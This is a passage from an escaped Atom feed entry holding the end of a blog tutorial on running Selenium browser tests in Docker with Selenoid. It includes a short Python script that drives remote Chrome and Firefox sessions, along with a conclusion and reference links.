+&lt;span class=&quot;n&quot;&gt;firefox&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;command_executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://localhost:4444/wd/hub'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;desired_capabilities&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DesiredCapabilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FIREFOX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://www.google.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;firefox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://www.google.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;firefox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;firefox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we run it, we could view two sessions in Selenoid UI available at the link:
+&lt;a href=&quot;http://localhost:8080/&quot;&gt;http://localhost:8080/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/selenium/selenoid-ui.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/selenium/selenoid-ui.png&quot; alt=&quot;selenoid-ui&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If we talk about simultaneous testing on different devices, e.g: we have a cross-platform web app with a real-life chat function, we can simultaneously test the interaction between them, that is obviously comfortable.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Solution on the basis of Selenium in Docker demonstrates high flexibility for configuration of the runtime environment.
+The stability of this solution, significant time savings when using it and a number of additional features allow us to optimize the process and ensure high-quality software products in a short time.
+As a result, it allow us to perform test automation tasks quickly and accurately.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/GRomR1/python-selenium-tests&quot;&gt;Here&lt;/a&gt; you can download the fully configured project and play with it.&lt;/p&gt;
+
+&lt;p&gt;Happy testing!&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://aerokube.com/&quot;&gt;Aerokube. Efficient Selenium Testing Infrastructure&lt;/a&gt; - the start page to explore automation testing&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://selenium-python.readthedocs.io/&quot;&gt;Selenium with Python&lt;/a&gt; - Selenium library for Python&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="devops" /><category term="python" /><category term="selenium" /><category term="testing" /><category term="selenoid" /><category term="docker" /><category term="QA" /><summary type="html">Selenoid is a server, that launches isolated browsers within Docker containers. All browser processes are fully isolated. This allows launching an unhindered number of multiple browser versions concurrently. Selenoid is written in Golang and supports all popular browsers.</summary></entry></feed>
